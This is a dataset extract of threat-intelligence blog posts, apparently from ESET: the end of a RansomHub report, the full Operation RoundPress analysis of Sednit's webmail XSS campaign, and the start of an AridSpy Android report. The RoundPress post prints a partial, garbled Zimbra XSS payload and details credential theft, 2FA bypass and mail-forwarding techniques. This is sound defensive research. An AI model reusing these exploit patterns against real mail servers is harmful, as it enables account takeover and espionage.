short period, and was quickly able to climb to the top of the ladder.\nIn the foreseeable future, RansomHub will surely try to remain among the most active RaaS gangs.\nLaw-enforcement-led disruptions of RaaS operators have proved effective, sowing distrust in the RaaS ecosystem.\nUnfortunately, 2024 showed that affiliates are able to regroup fairly quickly.\nAfter all, they have strong financial incentives to deploy encryptors to and exfiltrate sensitive data from their targets.\nAlthough more difficult to accomplish than disruptions, eliminating the most active affiliates from the picture is also effective because it can prevent new RaaS operators from gaining strength as quickly as RansomHub did.\nWe believe that focusing on the affiliates, especially by tracking down their links between various gangs – as demonstrated in this blogpost between RansomHub, Play, Medusa, and BianLian – will ultimately lead to identification of the affiliates and their removal from the game.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs A comprehensive list of indicators of compromise and samples can be found in our GitHub repository.\nFiles SHA-1 Filename Detection Description 97E13515263002809505 DC913B04B49AEB78B067 amd64.exe WinGo/Kryptik.\nCV RansomHub encryptor.\nBF84712C5314DF2AA851 B8D4356EA51A9AD50257 Loader.exe Win64/Agent.\nDVP EDRKillShifter.\n87D0F168F049BEFE455D 5B702852FFB7852E7DF6 amd64.exe WinGo/Kryptik.\nCV RansomHub encryptor.\n2E89CF3267C8724002C3 C89BE90874A22812EFC6 Magic.exe Win64/Agent.\nDVP EDRKillShifter.\n3B035DA6C69F9B05868F FE55D7A267D098C6F290 TDSSKiller.exe Win32/RiskWare.\nTDSSKiller.\nA TDSSKiller.\n5ECAFF68D36EC1033742 8267D05CD3CB632C0444 svchost.exe WinGo/HackTool.\nAgent.\nEY Rclone.\nDCF711141D6033DF4C91 49930B0E1078C3B6D156 anydes.ps1 PowerShell/Agent.\nAEK Script that deploys and password protects AnyDesk.\nE38082AE727AEAEF4F24 1A1920150FDF6F149106 netscan.exe Win64/NetTool.\nSoft PerfectNetscan.\nA SoftPerfect Network Scanner.\n046583DEB4B418A6F1D8 DED8BED9886B7088F338 conhost.dll Win64/Coroxy.\nJ SystemBC.\n3B4AEDAFA9930C19EA88 9723861BF95253B0ED80 win64_1.exe Win64/Agent.\nRA BianLian backdoor.\n460D7CB14FCED78C701E 7668C168CF07BCE94BA1 WKTools.exe Win32/WKTools.\nA WKTools.\n5AF059C44D6AC8EF92AA 458C5ED77F68510F92CD pfw.exe Win64/Agent.\nRA BianLian backdoor.\n67D17CA90880B448D5C3 B40F69CEC04D3649F170 1721894530.sys Win64/RentDrv.\nA Vulnerable driver used by EDRKillShifter.\n77DAF77D9D2A08CC2298 1C004689B870F74544B5 Killer.exe Win64/Agent.\nDVP EDRKillShifter.\n180D770C4A55C62C09AA D1FC3412132D87AF5CF6 1.dll Win64/Coroxy.\nK SystemBC.\nDD6FA8A7C1B3E009F5F1 7176252DE5ACABD0FB86 d.exe Win32/Filecoder .PLAY.B Play encryptor.\nFDA5AAC0C0DB36D173B8 8EC9DED8D5EF1727B3E2 GT_NET.exe MSIL/Spy.\nGrixba.\nA Grixba.\nNetwork | IP | Domain | Hosting provider | First seen | Details | | 45.32.206[.]169 | N/A | Vultr Holdings, LLC | 2024‑07‑25 | Server hosting WKTools and EDRKillShifter.\n| | 45.32.210[.]151 | N/A | The Constant Company, LLC | 2024‑08‑09 | SystemBC C&C server.\n| | 79.124.58[.]130 | N/A | TAMATYA-MNT | 2024‑08‑22 | Server hosting MeshAgent.\n| | 92.243.64[.]200 | N/A | EDIS GmbH - Noc Engineer | 2024‑07‑25 | BianLian backdoor C&C server.\n| | 130.185.75[.]198 | N/A | Pars Parva System LTD | 2024‑08‑20 | Server hosting PuTTY.\n| | 149.154.158[.]222 | N/A | EDIS GmbH - Noc Engineer | 2024‑07‑25 | Server hosting BianLian backdoor.\n| MITRE ATT&CK techniques This table was built using version 16 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Resource Development | T1583 | Acquire Infrastructure | QuadSwitcher acquired infrastructure to host their tooling.\n| | T1587.001 | Develop Capabilities: Malware | The RansomHub, Play, Medusa, and BianLian gangs develop their own encryptors and related tooling.\n| | | T1588.001 | Obtain Capabilities: Malware | The Play gang uses SystemBC, a commodity malware for sale.\n| | | T1588.002 | Obtain Capabilities: Tool | Various third-party tools are regularly used by the gangs’ affiliates.\n| | | T1608.001 | Stage Capabilities: Upload Malware | The Play gang uploaded its own tooling to a dedicated server to be used during intrusions.\n| | | T1608.002 | Stage Capabilities: Upload Tool | The Play gang uploaded the third-party tools it uses to a dedicated server to be used during intrusions.\n| | | Execution | T1059.001 | Command-Line Interface: PowerShell | QuadSwitcher deployed AnyDesk using a PowerShell script.\n| | T1059.003 | Command-Line Interface: Windows Command Shell | Windows Command Shell is regularly used by QuadSwitcher to issue commands.\n| | | Defense Evasion | T1078 | Valid Accounts | QuadSwitcher abuses extracted credentials of valid accounts to move in the network stealthily.\n| | T1078.002 | Valid Accounts: Domain Accounts | QuadSwitcher ultimately gained domain admin privileges in some of the intrusions.\n| | | T1480 | Execution Guardrails | RansomHub’s encryptor requires a password to run.\n| | | T1562.001 | Impair Defenses: Disable or Modify Tools | EDRKillShifter’s aim is to disable security solutions.\n| | | T1562.009 | Impair Defenses: Safe Mode Boot | RansomHub’s encryptor allows rebooting to safe mode to encrypt files.\n| | | T1218 | System Binary Proxy Execution | QuadSwitcher abused certutil.exe to download payloads.\n| | | Credential Access | T1110 | Brute Force | QuadSwitcher attempted to brute force credentials during the intrusions.\n| | Discovery | T1087 | Account Discovery | In order to elevate privileges, QuadSwitcher discovered additional accounts.\n| | T1057 | Process Discovery | EDRKillShifter looks for specific processes related to security solutions.\n| | | Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | RDP was often used for lateral movement in the compromised networks.\n| | T1021.002 | Remote Services: SMB/Windows Admin Shares | RansomHub supports remote encryption of files.\n| | | Collection | T1005 | Data from Local System | The BianLian gang focuses on data exfiltration, collecting data from local drives.\n| | T1039 | Data from Network Shared Drive | The BianLian gang focuses on data exfiltration, collecting data from network drives.\n| | | Command and Control | T1071 | Application Layer Protocol | In Play intrusions, payloads are retrieved via HTTP.\n| | T1132.002 | Data Encoding: Non-Standard Encoding | SystemBC employs a custom network protocol.\n| | | T1219 | Remote Access Software | Multiple RMM tools were used, including AnyDesk and MeshAgent.\n| | | Exfiltration | T1537 | Transfer Data to Cloud Account | BianLian affiliates used Rclone to exfiltrate data to a cloud account they control to avoid typical file transfers/downloads and network-based exfiltration detection.\n| | Impact | T1485 | Data Destruction | Some data like backups may be permanently destroyed by ransomware gangs.\n| | T1486 | Data Encrypted for Impact | The ultimate result of ransomware gangs’ actions is encryption of victims’ data.\n| | | T1657 | Financial Theft | The ransomware gangs pressure victims to pay ransom in exchange for regaining access to their data.\n|","num_sentences":268,"metadata":{"source":"blog","platform":"welivesecurity","filename":"RansomHub"}}
{"id":203,"title":"Operation RoundPress targeting high-value webmail servers","publish_date":"2025-05-15","link":"https://www.welivesecurity.com/en/eset-research/operation-roundpress/","clean_text":"This blogpost introduces an operation that we named RoundPress, targeting high-value webmail servers with XSS vulnerabilities, and that we assess with medium confidence is run by the Sednit cyberespionage group.\nThe ultimate goal of this operation is to steal confidential data from specific email accounts.\nKey points of this blogpost: - In Operation RoundPress, the compromise vector is a spearphishing email leveraging an XSS vulnerability to inject malicious JavaScript code into the victim’s webmail page. -\nIn 2023, Operation RoundPress only targeted Roundcube, but in 2024 it expanded to other webmail software including Horde, MDaemon, and Zimbra. -\nFor MDaemon, Sednit used a zero-day XSS vulnerability.\nWe reported the vulnerability to the developers on November 1st, 2024 and it was patched in version 24.5.1. -\nMost victims are governmental entities and defense companies in Eastern Europe, although we have observed governments in Africa, Europe, and South America being targeted as well. -\nWe provide an analysis of the JavaScript payloads SpyPress.\nHORDE, SpyPress.\nMDAEMON, SpyPress.\nROUNDCUBE, and SpyPress.\nZIMBRA. -\nThese payloads are able to steal webmail credentials, and exfiltrate contacts and email messages from the victim’s mailbox. -\nAdditionally, SpyPress.\nMDAEMON is able to set up a bypass for two-factor authentication.\nSednit profile The Sednit group – also known as APT28, Fancy Bear, Forest Blizzard, or Sofacy – has been operating since at least 2004.\nThe US Department of Justice named the group as one of those responsible for the Democratic National Committee (DNC) hack just before the 2016 US elections and linked the group to the GRU.\nThe group is also presumed to be behind the hacking of global television network TV5Monde, the World Anti-Doping Agency (WADA) email leak, and many other incidents.\nSednit has a diversified set of malware tools in its arsenal, several examples of which we have documented previously in our Sednit white paper from 2016.\nLinks to Sednit On September 29th, 2023, we detected a spearphishing email, part of Operation RoundPress, sent from katecohen1984@portugalmail[.]pt (envelope-from address).\nThe email exploited CVE‑2023‑43770 in Roundcube.\nThis email address is very similar to the ones used in other Sednit campaigns in 2023, as documented by Unit42 for example.\nLeveraging a network scan we ran in February 2022, we found the server 45.138.87[.]250 / ceriossl[.]info, which was configured in the same unique way as 77.243.181[.]238 / global-world-news[.]net.\nThe former was mentioned in a Qianxin blogpost describing a campaign abusing CVE-2023-23397 that attributed it to Sednit.\nThe latter is a domain used in Operation RoundPress in 2023.\nGiven these two elements, we believe with medium confidence that Operation RoundPress is carried out by Sednit.\nVictimology Table 1 and Figure 1 detail targets of Operation RoundPress in 2024, from ESET telemetry and two samples on VirusTotal.\nMost of the targets are related to the current war in Ukraine; they are either Ukrainian governmental entities or defense companies in Bulgaria and Romania.\nNotably, some of these defense companies are producing Soviet-era weapons to be sent to Ukraine.\nOther targets include African, EU, and South American governments.\nTable 1.\nOperation RoundPress victims in 2024 | Date | Country | Sector | | 2024-05 | Greece | National government.\n| | Romania | Unknown (VirusTotal submission).\n| | | Ukraine | Specialized Prosecutor’s Office in the Field of Defense of the Western Region (VirusTotal submission).\n| | | 2024-06 | Bulgaria | Telecommunications for the defense sector.\n| | Cameroon | National government.\n| | | Ukraine | Military.\n| | | 2024-07 | Ecuador | Military.\n| | Ukraine | Regional government.\n| | | Serbia | National government.\n| | | 2024-09 | Cyprus | An academic in environmental studies.\n| | Romania | Defense company.\n| | | Ukraine | Military.\n| | | 2024-10 | Bulgaria | Defense company.\n| | 2024-11 | Bulgaria | Defense company (not the same as in 2024-10).\n| | Ukraine | Civil air transport company.\n| | | Defense company.\n| || | 2024-12 | Ukraine | State company in the transportation sector.\n| Compromise chain Initial access In 2023, Sednit was exploiting CVE-2020-35730, a known XSS vulnerability in Roundcube (see this CERT-UA blogpost and this Recorded Future report), which enables the loading of arbitrary JavaScript code in the context of the webmail window.\nIn 2024, we observed different XSS vulnerabilities being used to target additional webmail software: Horde, MDaemon, and Zimbra.\nSednit also started to use a more recent vulnerability in Roundcube, CVE-2023-43770.\nThe MDaemon vulnerability (CVE-2024-11182, now patched) was a zero day, most likely discovered by Sednit, while the ones for Horde, Roundcube, and Zimbra were already known and patched.\nSednit sends these XSS exploits by email.\nThe exploits lead to the execution of malicious JavaScript code in the context of the webmail client web page running in a browser window.\nTherefore, only data accessible from the victim’s account can be read and exfiltrated.\nNote that, in order for the exploit to work, the target must be convinced to open the email message in the vulnerable webmail portal.\nThis means that the email needs to bypass any spam filtering and the subject line needs to be convincing enough to entice the target into reading the email message.\nFigure 2 summarizes the compromise chain used in Operation RoundPress.\nGenerally, the email message looks benign and contains text about news events.\nFor example, on September 11th, 2024, a Ukrainian target received a phishing email from kyivinfo24@ukr[.]net with the subject СБУ схопила банкіра, який працював на ворожу воєнну розвідку в Харкові (machine translation: SBU arrested a banker who worked for enemy military intelligence in Kharkiv).\nThe message body – see Figure 3 – contains excerpts (in Ukrainian) and links to articles from Kyiv Post, a well-known newspaper in Ukraine.\nThe malicious code that triggers the XSS vulnerability is inside the HTML code of the email message’s body and is not directly visible to the user.\nAnother example is an email from office@terembg[.]com to a Bulgarian target on November 8th, 2024, with the subject Путин се стреми Тръмп да приеме руските условия вдвустранните отношения (machine translation: Putin seeks Trump’s acceptance of Russian conditions in bilateral relations).\nThe message body – see Figure 4 – again contains excerpts (in Bulgarian) and links to articles from News.bg, a legitimate Bulgarian newspaper.\nNote that some of these vulnerabilities are not of interest exclusively to this group: GreenCube (also known as UNC3707) and Winter Vivern have been exploiting them as well.\nHorde: Unknown exploit For targets using Horde webmail, we have seen Sednit using an old vulnerability.\nWe were unable to find the exact vulnerability, but it appears to be an XSS flaw that was already fixed in the first version of Xss.php committed to GitHub, and in Horde Webmail 1.0, which was released in 2007.\nThe intended exploit used by Sednit is shown in Figure 5.\nPlacing malicious JavaScript code in the onerror attribute of an img element is a technique taken straight from the XSS playbook: because the src attribute is x, an undefined value, onerror is called and the payload is base64 decoded and then evaluated using window.parent.eval.\nIn Horde Webmail version 1.0, the XSS filter removes the style elements and the on* attributes, such as onerror.\nThus, we believe that Sednit made a mistake and tried to use a nonworking exploit.\nMDaemon: CVE-2024-11182 On November 1st, 2024, we detected an email message sent to two Ukrainian state-owned defense companies and a Ukrainian civil air transport company.\nThis message exploited a zero-day XSS vulnerability in MDaemon Email Server, in the rendering of untrusted HTML code in email messages.\nWe reported the vulnerability to the developers on November 1st, 2024 and it was patched in version 24.5.1, which was released on November 14th, 2024; we then issued CVE-2024-11182 for it.\nThe exploit used by Sednit is shown in Figure 6.\nJust as for Horde, it relies on a specially crafted img element, but uses a bug in the MDaemon HTML parser where a noembed end tag inserted within the title attribute of a p element tricks the parser into rendering the immediately succeeding img tag.\nRoundcube: CVE-2023-43770 For targets using Roundcube webmail: in 2023, Sednit used the XSS vulnerability CVE‑2020‑35730, while in 2024, it switched to CVE-2023-43770.\nThe more recent vulnerability was patched on September 14th, 2023 in this GitHub commit.\nThe fix is in a regex in the rcube_string_replacer.php script.\nThe exploit used by Sednit is quite simple and is depicted in Figure 7.\nIn rcube_string_replacer.php, URLs are converted to hyperlinks, and the hyperlink text is what is expected to be provided between the outer set of square brackets.\nThe bug lies in the fact that the hyperlink text is not properly sanitized, allowing the characters < and >.\nThis enables an attacker to provide JavaScript code contained between and , which is directly added to the page when the email is rendered in Roundcube.\nZimbra: CVE-2024-27443 / ZBUG-3730 For Zimbra, Sednit uses CVE-2024-27443 (also tracked as ZBUG-3730).\nIt was patched on March 1st, 2024 in this GitHub commit, in the ZmInviteMsgView.js file.\nThe vulnerability lies in failing to sanitize the cif (calendar intended for) attribute, in a calendar invitation sent by email.\nThe cif attribute is populated from the email header X-Zimbra-Calendar-Intended-For.\nBefore the patch, the value was directly added to the Zimbra HTML page without sanitization.\nThis allowed the execution of malicious JavaScript code in the context of the webmail browser window.\nThe exploit code that we found in this header is the following: Zimbra Calendar The beautified code contained in the onerror attribute is: window['eval'](window[(function(jvqka){'atob'()](frames[0].document.getElementById('a-cashed-skinLayout2')['innerText'])) Basically, this reads the text contained in a div element, identified by ID a-cashed-skinLayout2, that is present in the body of the calendar invite.\nThis div element uses the style attribute with the value display:none so that it is not visible to the target.\nThe inner text contains base64-encoded JavaScript code that is run using eval.\nPersistence The JavaScript payloads (SpyPress) loaded by the XSS vulnerabilities don’t have true persistence, but they are reloaded every time the victim opens the malicious email.\nIn addition, we detected a few SpyPress.\nROUNDCUBE payloads that have the ability to create Sieve rules.\nSpyPress.\nROUNDCUBE creates a rule that will send a copy of every incoming email to an attacker-controlled email address.\nSieve rules are a feature of Roundcube and therefore the rule will be executed even if the malicious script is no longer running.\nCredential access All SpyPress payloads have the ability to steal webmail credentials by trying to trick the browser or password manager to fill webmail credentials into a hidden form.\nIn addition, some samples also try to trick the victim by logging them out of their webmail account and displaying a fake login page.\nCollection and exfiltration Most SpyPress payloads collect email messages and contact information from the victim’s mailbox.\nThe data is then exfiltrated via an HTTP POST request to a hardcoded C&C server.\nToolset In 2024, we have observed Sednit using four payloads in Operation RoundPress: SpyPress.\nHORDE, SpyPress.\nMDAEMON, SpyPress.\nROUNDCUBE, and SpyPress.\nZIMBRA.\nThey are injected into the victims’ webmail context using XSS vulnerabilities, as explained above.\nThe four payloads have common characteristics.\nAll are similarly obfuscated, with variable and function names replaced with random-looking strings – see Figure 8.\nFurthermore, strings used by the code, such as webmail and C&C server URLs, are also obfuscated and contained in an encrypted list.\nEach of those strings is only decrypted when it is used.\nNote that the variable and function names are randomized for each sample, so the final SpyPress payloads will have different hashes.\nAnother common characteristic is that there are no persistence or update mechanisms.\nThe payload is fully contained in the email and only executed when the email message is viewed from a vulnerable webmail instance.\nFinally, all payloads communicate with their hardcoded C&C servers via HTTP POST requests.\nThere is a small number of C&C servers that are shared by all payloads (there is no separation by victim or payload type).\nSpyPress.\nHORDE SpyPress.\nHORDE is the JavaScript payload injected into vulnerable Horde webmail instances.\nOnce deobfuscated, and functions and variables are manually renamed, it reveals its main functionality: collecting and exfiltrating user credentials.\nCapabilities To steal credentials, as shown in Figure 9, SpyPress.\nHORDE creates two HTML input elements: horde_user and horde_pass.\nTheir width and opacity are set to 0%, ensuring that they are not visible to the user.\nThe goal is to trick browsers and password managers into filling those values.\nNote that a callback for the change event is created on the input horde_pass.\nThis calls the function input_password_on_change as soon as the input element loses focus after its value is changed.\nThen, input_password_on_change exfiltrates the data by calling C2_POST_Request, as can be seen in Figure 10.\nNetwork protocol The C&C URL is hardcoded in the script (see Figure 10) and the exfiltration is done via an HTTPS POST request.\nThe body data has a specific format that is sent base64 encoded.\nFor example, bWVAdmljdGltLm9yZyA6OiBweAoKbXl1c2VybmFtZSBteXBhc3N3b3Jk decodes to: me@victim.org :: pxmyusername mypassword where px probably means password exfiltration.\nNote that the HTTP request is made by the victim’s browser, so HTTP headers such as the User-Agent will vary from victim to victim.\nSpyPress.\nMDAEMON SpyPress.\nMDAEMON is a JavaScript payload injected into vulnerable MDaemon webmail instances.\nOnce deobfuscated, it reveals more functionality than what was implemented in SpyPress.\nHORDE: - credential stealing (very similar to the SpyPress.\nHORDE implementation), - exfiltration of contacts and login history, - exfiltration of email messages, - exfiltration of the two-factor authentication secret, and - creation of an App Password, which enables attackers to access the mailbox from a mail application and to bypass 2FA protection.\nCapabilities Credential stealer The credential stealer of SpyPress.\nMDAEMON is almost identical to that of SpyPress.\nHORDE – see Figure 11.\nThe only difference is the name of the input fields, which are User and Password, to match the official names used in the MDaemon software.\nContacts and login history SpyPress.\nMDAEMON obtains the victim’s login history from https:// Then, as shown in Figure 12, the script obtains the victim’s contact list from https:// Email message exfiltration SpyPress.\nMDAEMON browses the victim’s mailbox folders, as shown in Figure 13, and filters out a hardcoded list of folders the attackers are not interested in: calendar, notes, documents, contacts, tasks, allowed senders, and blocked senders.\nThen, for each folder, as shown in Figure 14, SpyPress.\nMDAEMON iterates over the pages and then over all messages in each page, before exfiltrating each email to the C&C server.\nTo get a list of email messages in a given folder page, SpyPress.\nMDAEMON fetches https:// Then, it iterates over this list and fetches https:// Finally, the email source is exfiltrated via an HTTP POST request to the C&C server, using the message type mail- Note that the script maintains a list of exfiltrated emails, thereby avoiding the exfiltration several times.\nAlso note that the obfuscator seems to have introduced errors in the script.\nIn the function download_all_messages_from_folder, is_folder_limit is a real variable name that was left unobfuscated.\nHowever, it is not used anywhere in the code.\nTwo-factor authentication secret SpyPress.\nMDAEMON exfiltrates the victim’s two-factor authentication secret – see Figure 15.\nIt first fetches https:// To view the secret, the password is required, which SpyPress.\nMDAEMON gets from the fake login form it created.\nThis secret is equivalent to the QR code mentioned in MDaemon documentation and it can be used to register the account in an authentication app, to then generate a valid 2FA code for the victim’s account.\nBecause SpyPress.\nMDAEMON acquires the password and the 2FA secret, attackers will be able to log into the account directly.\nApp Password creation In addition to stealing the 2FA secret, SpyPress.\nMDAEMON creates an App Password (see the documentation).\nThis password can be used in an email client to send and receive messages, without having to enter the 2FA code, even if 2FA is activated for the account.\nNote that MDaemon webmail doesn’t seem to require a 2FA code to generate a new application password.\nAs shown in Figure 16, SpyPress.\nMDAEMON fetches https:// In other words, this application password enables attackers to add the email account directly to their own email client.\nThey can thereby keep access to the mailbox even if the main password of the victim’s account is changed or if the 2FA code is changed.\nNetwork protocol SpyPress.\nMDAEMON uses the same network protocol as SpyPress.\nHORDE.\nSpyPress.\nROUNDCUBE SpyPress.\nROUNDCUBE is the JavaScript payload injected into vulnerable Roundcube webmail instances.\nOnce deobfuscated, it reveals similar functionalities to what is implemented in SpyPress.\nMDAEMON: - credential stealing, - exfiltration of the address book and the about page, - exfiltration of emails, and - malicious Sieve rules.\nCapabilities Credential stealer The credential stealer of SpyPress.\nROUNDCUBE has two features.\nThe first one is almost identical to the credential stealer of SpyPress.\nHORDE and SpyPress.\nMDAEMON.\nThe only difference is the name of the input fields, which are _user and _pass, to match the official names used in the Roundcube software.\nThe second feature is slightly more intrusive.\nSpyPress.\nROUNDCUBE creates an iframe, as shown in Figure 17, with the src attribute set to https:// Note that the CSRF token is retrieved from the variable rcmail.env.request_token.\nThe rcmail global variable is managed and filled by the Roundcube instance, and accessible in the JavaScript context that SpyPress.\nROUNDCUBE is running in.\nExfiltration of the address book and the about page SpyPress.\nROUNDCUBE fetches the address book at https:// Similarly, SpyPress.\nROUNDCUBE fetches the about page at https:// That page contains information about the Roundcube version and the plugins installed, as shown in Figure 18.\nEmail message exfiltration SpyPress.\nROUNDCUBE starts the email exfiltration routine every 7,200 seconds (two hours).\nFirst, it gets the list of mailboxes from the global variable rcmail.env.mailboxes.\nThen, it iterates over all those mailboxes; for each of them, it iterates over the pages to get the email message IDs by fetching https:// Also note that there is a lower bound time hardcoded in the script, 6:02:03 am, October 1st, 2024 in the specific script sample we analyzed, and only emails more recent than this are exfiltrated.\nThe source of each email message is fetched from https:// Note that if SpyPress.\nROUNDCUBE has exfiltrated more than 150 emails in a row, it stops the exfiltration until the next execution of the email exfiltration routine (two hours later).\nThis is probably done to limit the noise on the victim’s network and avoid detection.\nMalicious Sieve rules In some SpyPress.\nROUNDCUBE samples, there is additional functionality related to Sieve rules – see Figure 19.\nSpyPress.\nROUNDCUBE creates a rule that sends a copy of every incoming email message to an attacker-controlled email address (srezoska@skiff[.]com in this case).\nSkiff was a privacy-oriented email service that provided end-to-end encryption.\nNetwork protocol SpyPress.\nROUNDCUBE uses the same network protocol as SpyPress.\nHORDE.\nSpyPress.\nZIMBRA SpyPress.\nZIMBRA is the JavaScript payload injected into vulnerable Zimbra webmail instances.\nOnce deobfuscated, it reveals similar functionalities to the previous payloads: - credential stealing, - exfiltration of contacts and settings, and - exfiltration of email messages.\nCapabilities Credential stealer The credential stealer of SpyPress.\nZIMBRA is almost identical to those of SpyPress.\nHORDE and SpyPress.\nMDAEMON.\nThe only difference is the name of the input fields, which are username and password, to match the official names used in the Zimbra software.\nExfiltration of contacts and settings SpyPress.\nZIMBRA fetches the victim’s contact list by making a SOAP request to the Zimbra API endpoint https:// SpyPress.\nZIMBRA also exfiltrates to the C&C server the content of the global variable ZmSetting, which contains various configuration and preference values.\nThis is similar to SpyPress.\nROUNDCUBE, which exfiltrates the about page.\nEmail exfiltration Every 14,400 seconds (four hours), using the setInterval function, this payload starts its email exfiltration routine.\nAs for the previous payloads, SpyPress.\nZIMBRA first lists the folders, then iterates over the first 80 emails in each folder via a SOAP request to https:// Network protocol SpyPress.\nZIMBRA uses the same network protocol as SpyPress.\nHORDE.\nConclusion Over the past two years, webmail servers such as Roundcube and Zimbra have been a major target for several espionage groups such as Sednit, GreenCube, and Winter Vivern.\nBecause many organizations don’t keep their webmail servers up to date and because the vulnerabilities can be triggered remotely by sending an email message, it is very convenient for attackers to target such servers for email theft.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs A comprehensive list of indicators of compromise (IoCs) and samples can be found in our GitHub repository.\nFiles | SHA-1 | Filename | Detection | Description | | 41FE2EFB38E0C7DD10E6 | N/A | JS/Agent.\nRSO | SpyPress.\nZIMBRA.\n| | 60D592765B0F4E08078D | N/A | JS/Exploit.\nAgent.\nNSH | XSS exploit for CVE-2023-43770.\n| | 1078C587FE2B246D618A | N/A | JS/Exploit.\nAgent.\nNSH | SpyPress.\nROUNDCUBE.\n| | 8EBBBC9EB54E216EFFB4 | N/A | HTML/Phishing.\nAgent.\nGNZ | XSS exploit for CVE-2024-11182.\n| | F95F26F1C097D4CA3830 | N/A | HTML/Phishing.\nAgent.\nGNZ | SpyPress.\nMDAEMON.\n| | 2664593E2F5DCFDA9AAA | N/A | JS/Agent.\nSJU | Probable XSS exploit for Horde.\n| | B6C340549700470C6510 | N/A | JS/Agent.\nSJU | SpyPress.\nHORDE.\n| | 65A8D221B9ECED76B9C1 | N/A | HTML/Phishing.\nGen | SpyPress.\nROUNDCUBE.\n| | 6EF845938F064DE39F4B | N/A | N/A | Email exploiting CVE-2023-43770, found on VirusTotal.\n| | 8E6C07F38EF920B5154F | N/A | JS/Agent.\nRSP | SpyPress.\nROUNDCUBE.\n| | AD3C590D1C0963D62702 | N/A | JS/Agent.\nRSN | SpyPress.\nZIMBRA.\n| | EBF794E421BE60C95320 | N/A | JS/Agent.\nRTD | SpyPress.\nROUNDCUBE.\n| | F81DE9584F0BF3E55C6C | N/A | JS/Agent.\nRWO | SpyPress.\nROUNDCUBE.\n| | A5948E1E45D50A8DB063 | N/A | JS/Exploit.\nAgent.\nNSG | XSS exploit for CVE-2023-43770.\n| Network | IP | Domain | Hosting provider | First seen | Details | | 185.225.69[.]223 | sqj[.]fr | 23VNet Kft.\n| 2024‑06‑01 | SpyPress C&C server.\n| | 193.29.104[.]152 | tgh24[.]xyz tuo[.]world | GLOBALAXS NOC PARIS | 2024‑06‑04 | SpyPress C&C server.\n| | 45.137.222[.]24 | lsjb[.]digital | Belcloud Administration | 2024‑07‑03 | SpyPress C&C server.\n| | 91.237.124[.]164 | jiaw[.]shop | HOSTGNOME LTD | 2023‑09‑28 | SpyPress C&C server.\n| | 185.195.237[.]106 | hfuu[.]de | Network engineer | 2024‑06‑03 | SpyPress C&C server.\n| | 91.237.124[.]153 | raxia[.]top | Damien Cutler | 2024‑06‑03 | SpyPress C&C server.\n| | 146.70.125[.]79 | rnl[.]world | GLOBALAXS NOC PARIS | 2024‑06‑07 | SpyPress C&C server.\n| | 89.44.9[.]74 | hijx[.]xyz | M247 Europe SRL | 2024‑07‑05 | SpyPress C&C server.\n| | 111.90.151[.]167 | ikses[.]net | Shinjiru Technology Sdn Bhd | 2024‑12‑01 | SpyPress C&C server.\n| MITRE ATT&CK techniques This table was built using version 17 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Resource Development | T1583.001 | Acquire Infrastructure: Domains | Sednit bought domains at various registrars.\n| | T1583.004 | Acquire Infrastructure: Server | Sednit rented servers at M247 and other hosting providers.\n| | | T1587.004 | Develop Capabilities: Exploits | Sednit developed (or acquired) XSS exploits for Roundcube, Zimbra, Horde, and MDaemon.\n| | | T1587.001 | Develop Capabilities: Malware | Sednit developed JavaScript stealers (SpyPress.\nHORDE, SpyPress.\nMDAEMON, SpyPress.\nROUNDCUBE, and SpyPress.\nZIMBRA) to steal data from webmail servers.\n| | | Initial Access | T1190 | Exploit Public-Facing Application | Sednit exploited known and zero-day vulnerabilities in webmail software to execute JavaScript code in the context of the victim’s webmail window.\n| | Execution | T1203 | Exploitation for Client Execution | SpyPress payloads are executed when a victim opens the malicious email in a vulnerable webmail client page.\n| | Defense Evasion | T1027 | Obfuscated Files or Information | SpyPress payloads are obfuscated with an unknown JavaScript obfuscator.\n| | Credential Access | T1187 | Forced Authentication | SpyPress payloads can log out users to entice them into entering their credentials in a fake login form.\n| | T1556.006 | Modify Authentication Process: Multi-Factor Authentication | SpyPress.\nMDAEMON can steal the 2FA token and create an application password.\n| | | Discovery | T1087.003 | Account Discovery: Email Account | SpyPress payloads get information about the email account, such as the contact list.\n| | Collection | T1056.003 | Input Capture: Web Portal Capture | SpyPress payloads try to steal webmail credentials by creating a hidden login form, to trick the browser and password managers into filling the credentials.\n| | T1119 | Automated Collection | SpyPress payloads automatically collect credentials and email messages.\n| | | T1114.002 | Email Collection: Remote Email Collection | SpyPress payloads collect and exfiltrate emails, from the victim’s mailbox.\n| | | T1114.003 | Email Collection: Email Forwarding Rule | SpyPress.\nMDAEMON adds a Sieve rule to forward any incoming email to an attacker-controlled email address.\n| | | Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | C&C communication is done via HTTPS.\n| | T1071.003 | Application Layer Protocol: Mail Protocols | In case of email forwarding rules, the exfiltration is done via email.\n| | | T1132.001 | Data Encoding: Standard Encoding | Data is base64 encoded before being sent to the C&C server.\n| | | Exfiltration | T1020 | Automated Exfiltration | SpyPress payloads automatically exfiltrate credentials and email messages to the C&C server.\n| | T1041 | Exfiltration Over C2 Channel | SpyPress payloads exfiltrate data over the C&C channel.\n|","num_sentences":306,"metadata":{"source":"blog","platform":"welivesecurity","filename":"RoundPress"}}
{"id":204,"title":"Arid Viper poisons Android apps with AridSpy","publish_date":"2024-06-13","link":"https://www.welivesecurity.com/en/eset-research/arid-viper-poisons-android-apps-with-aridspy/","clean_text":"ESET researchers have identified five campaigns targeting Android users with trojanized apps.\nMost probably carried out by the Arid Viper APT group, these campaigns started in 2022 and three of them are still ongoing at the time of the publication of this blogpost.\nThey deploy multistage Android spyware, which we named AridSpy, that downloads first- and second-stage payloads from its C&C server to assist it avoiding detection.\nThe malware is distributed through dedicated websites impersonating various messaging apps, a job opportunity app, and a Palestinian Civil Registry app.\nOften these are existing applications that had been trojanized by the addition of AridSpy’s malicious code.\nKey points of the blogpost: - ESET Research discovered three-stage Android malware, which we named AridSpy, being distributed via five dedicated websites. -\nAridSpy’s code is in some cases bundled into applications that provide legitimate functionality. -\nWhile the first stage of AridSpy has been documented previously, here we also provide a full analysis of its previously unknown later stages. -\nAridSpy is a remotely controlled trojan that focuses on user data espionage. -\nWe detected six occurrences of AridSpy, in Palestine and 